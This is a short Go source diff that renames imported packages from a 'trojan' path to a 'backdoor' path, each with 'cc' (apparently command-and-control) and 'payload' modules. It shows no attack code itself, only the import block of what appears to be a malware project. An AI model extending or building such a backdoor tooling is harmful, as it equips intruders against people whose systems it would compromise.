@@ -3,8 +3,8 @@ package main
 import (
 	"flag"
 
-	"gitlab.com/rawbots/trojan/cc"
-	"gitlab.com/rawbots/trojan/payload"
+	"gitlab.com/rawbots/backdoor/cc"
+	"gitlab.com/rawbots/backdoor/payload"
 )
 
 func main() {
